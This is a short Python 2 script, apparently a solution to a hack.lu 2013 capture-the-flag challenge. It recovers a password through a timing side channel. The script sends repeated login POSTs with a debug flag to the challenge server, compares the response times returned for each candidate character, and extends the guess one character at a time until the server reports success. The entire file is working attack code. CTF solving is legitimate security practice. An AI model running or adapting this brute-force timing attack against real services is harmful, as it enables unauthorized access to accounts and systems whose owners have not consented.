#!/bin/python
# hack.lu 2013
# meznak - Pi Backwards

import urllib2, string

url = "https://ctf.fluxfingers.net:1316/gimmetv"
headers = {"Content-type": "application/x-www-form-urlencoded"}
chars = list(string.letters + string.digits)

def post(password):
  req = urllib2.Request(url, "key=" + password + "&debug")
  try:
    rsp = urllib2.urlopen(req)
    data = rsp.read()
    rsp.close()
    return data
  except:
    print "Unable to connect."
    quit()

def get_time(password):
  data = post(password)
  sdata = data.split( )
  stime = float(sdata[1][:-1])
  etime = float(sdata[3][:-1])
  time = etime - stime
  success = sdata[-1][:-1]
  print password, time
  return time, success

def brute():
  password = ""
  success = "false"
  while (success == "false"):
    times = {}
    for c in chars:
      times[c], success = get_time(password + c)
      if (success != "false"):
        password += c
        break
    print times
    password += max(times.iterkeys(), key=(lambda key: times[key]))
    print "*** " + password
  return password

print "\n\n\n" + brute() + "\n\n\n"
